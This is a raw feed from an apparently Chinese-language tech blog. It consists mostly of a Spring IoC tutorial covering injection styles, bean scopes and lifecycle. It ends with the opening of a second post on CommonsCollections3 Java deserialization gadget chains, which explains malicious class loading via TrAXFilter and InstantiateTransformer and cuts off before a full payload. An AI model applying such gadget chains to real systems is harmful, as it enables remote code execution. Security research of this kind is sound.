class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2.test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTestBean2</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是由于没有给<code>setTestBean2()</code>传递参数，直接运行会爆空指针异常，这里还要改配置文件，让调用<code>setTestBean2()</code>时自动传入一个实例化好的<code>TestBean2</code>对象。需要在<code>testBean</code>的<code>&lt;bean&gt;</code>标签下设置<code>&lt;property&gt;</code>标签对字段进行注入</p><p><code>name</code>属性指向bean对象中<code>setter</code>方法中指向的字段名称，<code>ref</code> 指向另一个bean的<code>id</code>，Spring会把这个Bean对象作为参数值传递过去</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用测试程序调用<code>testBean</code>的<code>test()</code>方法成功打印<code>TestBean2 test</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> set注入也可以为基本类型和集合类型的字段赋值，这同样需要实现<code>setter</code>方法，不同点在于使用<code>value</code>属性指向传递的参数 </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span> <span class="attr">value</span>=<span class="string">&quot;test01&quot;</span> <span class="attr">key</span>=<span class="string">&quot;test&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="构造器注入"><a href="#构造器注入" class="headerlink" title="构造器注入"></a>构造器注入</h3><p>可以为要操作的bean对象设置带参构造器，通过构造器为字段赋值，如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件中，需要使用<code>&lt;constructor-arg&gt;</code>指向构造方法的参数名并传入值，下面的配置可以为多参构造器传递值，非bean数据类型使用<code>value</code>属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;string&quot;</span> <span class="attr">value</span>=<span class="string">&quot;asd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用<code>&lt;index&gt;</code>指定传参的位置</p><p> <strong>循环依赖问题</strong></p><p>构造器注入中，若某个bean对象需要注入另一个bean对象，需要先实例化另一个bean再传入构造器。倘若两个对象需要相互注入，会导致bean对象无法成功实例化，类似多线程的死锁问题，如下示例代码会导致循环依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean testBean;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean2</span><span class="params">(TestBean testBean)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean = testBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该问题在构造器注入中无法解决，只能通过set注入解决，因为set注入是先将bean对象全部先实例化再调用<code>setter</code>方法的</p><h3 id="静态工厂注入"><a href="#静态工厂注入" class="headerlink" title="静态工厂注入"></a>静态工厂注入</h3><p>与静态工厂实例化类似，通过静态工厂实例化另一个bean对象再返回出来作为字段，静态工厂方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TestBean2 <span class="title function_">injectTestBean2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestBean2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件写法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Factory.InjectFactory&quot;</span> factory-method=<span class="string">&quot;injectTestBean2&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>类似的还有实例工厂注入，该方法与上文的实例方法实例化类似，同时也需要实现<code>setter</code>方法，配置文件如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;injectFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Factory.InjectFactory&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;injectFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;injectTestBean2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="p名称空间"><a href="#p名称空间" class="headerlink" title="p名称空间"></a>p名称空间</h3><p>spring2.5以后，p名称空间被引入，该特性可以简化set注入的流程，将<code>&lt;property&gt;</code>标签简化为bean的一个属性，使用p名称空间需要引入<code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span> p:testBean2-ref=<span class="string">&quot;testBean2&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Beans.TestBean2&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><br/><h2 id="自动装配（注入）"><a href="#自动装配（注入）" class="headerlink" title="自动装配（注入）"></a>自动装配（注入）</h2><p>除了使用xml配置文件注入，还可以使用注解注入，这种方式能够简化注解流程，使程序更加简洁，Spring底层的注解注入主要通过反射实现</p><p><strong>前提</strong></p><p>引入命名空间</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">   &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在配置文件中擦插入<code>&lt;content:annotation-config/&gt;</code>开启自动化注入</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注解注入分<code>@Resource</code>和<code>@Autowired</code>两种</p><h3 id="Resource注解"><a href="#Resource注解" class="headerlink" title="@Resource注解"></a>@Resource注解</h3><p>该注解默认通过属性字段名称<code>name</code>查找对应的bean对象，如果字段不一样，则会通过<code>class</code>查找，该注解不需要实现<code>setter</code>方法，该注解可以声明在属性字段上或<code>setter</code>方法上（如果有的话）</p><p><code>@Resource</code>注解可以设置<code>name</code>属性，但此时要跟<code>id</code>一致</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTestBean2</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.testBean2.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入接口时，若接口有两个及以上实现类，需要使用<code>name</code>属性指定需要的实现类对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Autowired注解"><a href="#Autowired注解" class="headerlink" title="@Autowired注解"></a>@Autowired注解</h3><p>该注解默认通过<code>class</code>查找，与字段名称无关，该注解不需要<code>setter</code>方法，该注解可以声明在属性字段上或<code>setter</code>方法上（如果有的话）</p><p>该注解不支持添加<code>name</code>属性，如果需要达到相似的效果需要配合<code>@Qualifier</code>的<code>value</code>属性使用，<code>@Qualifier</code>的<code>value</code>属性必须要设置且需与bean的<code>id</code>属性相同</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h2><p>扫描器简化了配置文件添加<code>&lt;bean&gt;</code>标签的操作，扫描器的功能一样通过注解实现</p><p><strong>前提</strong></p><p>设置自动扫描范围，<code>base-package</code>后接包名表示扫描的范围，若对象不在扫描范围，即使添加注解也不会被实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;context:component-scan base-<span class="keyword">package</span>=<span class="string">&quot;Beans&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>使用特定的注解</p><table><thead><tr><th>注解</th><th>级别</th></tr></thead><tbody><tr><td><code>@Repository</code></td><td>Dao层</td></tr><tr><td><code>@Service</code></td><td>Service层</td></tr><tr><td><code>@Controller</code></td><td>Controller层</td></tr><tr><td><code>@Component</code></td><td>任意层</td></tr></tbody></table><p>使用方法还是很简单的，这里用了<code>@Component</code>注解之后配置文件就完全不用管了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Bean的作用域"><a href="#Bean的作用域" class="headerlink" title="Bean的作用域"></a>Bean的作用域</h2><p>对于bean的作用域主要有两种</p><h3 id="singleton作用域"><a href="#singleton作用域" class="headerlink" title="singleton作用域"></a>singleton作用域</h3><p><img src="/img/post/image-20251226113117234.png" alt="image-20251226113117234"></p><p><code>lazy-init</code>属性用于指定是否懒加载，懒加载在Spring启动时不会实例化该类，而在程序调用时实例化，默认情况下Spring会在启动时实例化类并缓存在容器中</p><p>么亲看下一个bean对象在IOC容器中只有一个实例，所有获取该bean的操作都返回同一个实例</p><p><strong>什么对象适合作为单例？</strong></p><p>无实例变量或保证实例变量全局统一的对象适合作为单例。因为单例对象在全局只有一个实例，若该单例存在实例变量，当该成员变量在某一处被修改时，会造成该单例的状态被全局修改，这不利于单例在全局的统一性。同时若该单例的实例变量被多线程修改，也会存在线程不安全问题</p><h3 id="prototype-作用域"><a href="#prototype-作用域" class="headerlink" title="prototype 作用域"></a>prototype 作用域</h3><p><img src="/img/post/image-20251226120150710.png" alt="image-20251226120150710"></p><p>通过<code>scope</code>属性设置为<code>prototype</code>的bean类型，每次向Spring请求都会获得一个全新的bean对象，Spring在启动时不会先实例化到缓存池，此方式获得的bean全局不唯一</p><h3 id="Web应用中的作用域"><a href="#Web应用中的作用域" class="headerlink" title="Web应用中的作用域"></a>Web应用中的作用域</h3><p><strong>request作用域</strong></p><p>表示每个请求需要容器创建一个全新Bean。比如提交表单的数据必须是对每次请求新建一个Bean来保持这些表单数据，请求结束释放这些数据</p><p><strong>session作用域</strong></p><p>表示每个会话需要容器创建一个全新Bean。比如对于每个用户一般会有一个会话，该用户的用户信息需要存储到会话中，此时可以将该Bean作用域配置为session级别</p><p><strong>globalSession作用域</strong></p><p>类似于session作用域，其用于portlet(Portlet是基于Java的Web组件，由Portlet容器管理，并由容器处理请求，生产动态内容环境的web)应用。如果在非portlet环境将视为session作用域</p><br/><h2 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h2><p>bean的生命周期包含定义、初始化、使用和销毁四个阶段</p><h3 id="bean的定义"><a href="#bean的定义" class="headerlink" title="bean的定义"></a>bean的定义</h3><p>定义bean的过程就是通过配置文档定义bean类型的过程</p><h3 id="bean的初始化"><a href="#bean的初始化" class="headerlink" title="bean的初始化"></a>bean的初始化</h3><p>bean的初始化可通过两种方法进行</p><p><strong>在配置文档中指定<code>init-method</code>进行</strong></p><p>为bean创建一个初始化方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件中指定<code>init-method</code>属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>实现<code>InitializingBean</code>接口</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件不需要<code>init-method</code>属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="bean的使用"><a href="#bean的使用" class="headerlink" title="bean的使用"></a>bean的使用</h3><p>bean可以通过<code>BeanFactory</code>获得</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) beanFactory.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br></pre></td></tr></table></figure><p>或者通过<code>ApplicationContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br></pre></td></tr></table></figure><p>二者没有本质区别，因为<code>ApplicationContext</code>实现了<code>ListableBeanFactory</code>接口，而<code>ListableBeanFactory</code>是<code>BeanFactory</code>的子接口</p><h3 id="bean的销毁"><a href="#bean的销毁" class="headerlink" title="bean的销毁"></a>bean的销毁</h3><p>为bean对象创建销毁方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定销毁方法</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroy&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调用<code>AbstractApplicationContext</code>的<code>close()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractApplicationContext applicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXm1ApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">applicationContext.close();</span><br></pre></td></tr></table></figure><p>程序会打印<code>destroy...</code></p><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections反序列化链变种</title>
      <link href="/2025/12/25/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%8F%98%E7%A7%8D/"/>
      <url>/2025/12/25/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%8F%98%E7%A7%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections反序列化链变种"><a href="#CommonsCollections反序列化链变种" class="headerlink" title="CommonsCollections反序列化链变种"></a>CommonsCollections反序列化链变种</h1><p>剩下部分CC链并没有引用Java的新特性，后面几个几乎就是在排列组合了，对于这些没有太大构造难度的链我选择合并记录</p><br/><h2 id="CommonsCollections3反序列化链"><a href="#CommonsCollections3反序列化链" class="headerlink" title="CommonsCollections3反序列化链"></a>CommonsCollections3反序列化链</h2><p>该链使用了<code>ChainedTransformer</code> 的链式调用和<code>LazyMap</code>依赖的动态代理，复现的jdk版本需要低于1.8.0_71</p><p>CC3链同样利用了动态加载恶意类实现命令执行，与CC2链不同的点在于CC3加载恶意类载体<code>templatesTmpl</code>的位置在<code>TrAXFilter</code>类的构造器中，该方法调用了<code>newTransformer()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而实例化<code>templatesTmpl</code>的位点则使用了<code>InstantiateTransformer</code>类的<code>transform()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; 